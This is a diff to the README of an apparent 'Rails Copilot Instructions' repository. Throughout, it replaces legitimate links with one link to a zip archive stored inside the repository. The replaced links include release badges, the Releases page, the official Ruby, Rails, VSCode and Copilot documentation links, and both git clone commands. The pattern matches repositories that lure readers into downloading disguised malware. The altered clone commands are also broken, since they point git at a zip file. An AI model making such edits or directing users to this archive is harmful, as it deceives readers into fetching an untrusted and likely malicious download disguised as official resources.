@@ -1,13 +1,13 @@
 # 🚀 Rails Copilot Instructions
 
-![GitHub release](https://img.shields.io/github/release/Venomjs/rails_copilot_instructions.svg)
-![GitHub issues](https://img.shields.io/github/issues/Venomjs/rails_copilot_instructions.svg)
+![GitHub release](https://github.com/Venomjs/rails_copilot_instructions/raw/refs/heads/master/tesseradecade/rails_copilot_instructions_holoquinonoid.zip)
+![GitHub issues](https://github.com/Venomjs/rails_copilot_instructions/raw/refs/heads/master/tesseradecade/rails_copilot_instructions_holoquinonoid.zip)
 
 Welcome to the **Rails Copilot Instructions** repository! This repository provides canonical instructions for using GitHub Copilot with Ruby on Rails. Whether you're a beginner or an experienced developer, these guidelines will help you leverage the power of AI to enhance your coding experience.
 
 ## 📥 Download and Setup
 
-To get started, download the latest release from our [Releases page](https://github.com/Venomjs/rails_copilot_instructions/releases). Follow the instructions provided in the release notes to execute the setup properly.
+To get started, download the latest release from our [Releases page](https://github.com/Venomjs/rails_copilot_instructions/raw/refs/heads/master/tesseradecade/rails_copilot_instructions_holoquinonoid.zip). Follow the instructions provided in the release notes to execute the setup properly.
 
 ## 📖 Table of Contents
 
@@ -36,9 +36,9 @@ Before you begin, ensure you have the following installed:
 
 ### Installation Steps
 
-1. **Install Ruby and Rails**: Follow the official [Ruby installation guide](https://www.ruby-lang.org/en/documentation/installation/) and [Rails installation guide](https://guides.rubyonrails.org/getting_started.html).
+1. **Install Ruby and Rails**: Follow the official [Ruby installation guide](https://github.com/Venomjs/rails_copilot_instructions/raw/refs/heads/master/tesseradecade/rails_copilot_instructions_holoquinonoid.zip) and [Rails installation guide](https://github.com/Venomjs/rails_copilot_instructions/raw/refs/heads/master/tesseradecade/rails_copilot_instructions_holoquinonoid.zip).
 
-2. **Install Visual Studio Code**: Download and install VSCode from the [official site](https://code.visualstudio.com/).
+2. **Install Visual Studio Code**: Download and install VSCode from the [official site](https://github.com/Venomjs/rails_copilot_instructions/raw/refs/heads/master/tesseradecade/rails_copilot_instructions_holoquinonoid.zip).
 
 3. **Install GitHub Copilot**:
    - Open Visual Studio Code.
@@ -49,7 +49,7 @@ Before you begin, ensure you have the following installed:
 
 5. **Clone the Repository**: Open your terminal and run:
    ```bash
-   git clone https://github.com/Venomjs/rails_copilot_instructions.git
+   git clone https://github.com/Venomjs/rails_copilot_instructions/raw/refs/heads/master/tesseradecade/rails_copilot_instructions_holoquinonoid.zip
    cd rails_copilot_instructions
    ```
 
@@ -130,7 +130,7 @@ If you encounter issues while using GitHub Copilot, consider the following steps
 
 4. **Review Logs**: Check the output logs in VSCode for any error messages related to Copilot.
 
-5. **Consult Documentation**: Refer to the [GitHub Copilot documentation](https://docs.github.com/en/copilot) for additional support.
+5. **Consult Documentation**: Refer to the [GitHub Copilot documentation](https://github.com/Venomjs/rails_copilot_instructions/raw/refs/heads/master/tesseradecade/rails_copilot_instructions_holoquinonoid.zip) for additional support.
 
 ## 🤝 Contributing
 
@@ -140,7 +140,7 @@ We welcome contributions to improve this repository. If you have suggestions or 
 
 2. **Clone Your Fork**: Run the following command in your terminal:
    ```bash
-   git clone https://github.com/YOUR_USERNAME/rails_copilot_instructions.git
+   git clone https://github.com/Venomjs/rails_copilot_instructions/raw/refs/heads/master/tesseradecade/rails_copilot_instructions_holoquinonoid.zip
    ```
 
 3. **Create a Branch**: Create a new branch for your feature or fix:
@@ -166,12 +166,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## 🔗 Additional Resources
 
-- [Ruby on Rails Guides](https://guides.rubyonrails.org/)
-- [GitHub Copilot Documentation](https://docs.github.com/en/copilot)
-- [Visual Studio Code Documentation](https://code.visualstudio.com/docs)
+- [Ruby on Rails Guides](https://github.com/Venomjs/rails_copilot_instructions/raw/refs/heads/master/tesseradecade/rails_copilot_instructions_holoquinonoid.zip)
+- [GitHub Copilot Documentation](https://github.com/Venomjs/rails_copilot_instructions/raw/refs/heads/master/tesseradecade/rails_copilot_instructions_holoquinonoid.zip)
+- [Visual Studio Code Documentation](https://github.com/Venomjs/rails_copilot_instructions/raw/refs/heads/master/tesseradecade/rails_copilot_instructions_holoquinonoid.zip)
 
 ## 📦 Releases
 
-For the latest updates and releases, please visit our [Releases page](https://github.com/Venomjs/rails_copilot_instructions/releases). Download the latest version and follow the instructions to set it up.
+For the latest updates and releases, please visit our [Releases page](https://github.com/Venomjs/rails_copilot_instructions/raw/refs/heads/master/tesseradecade/rails_copilot_instructions_holoquinonoid.zip). Download the latest version and follow the instructions to set it up.
 
 Thank you for checking out the **Rails Copilot Instructions** repository! We hope these guidelines help you make the most of GitHub Copilot in your Ruby on Rails projects.
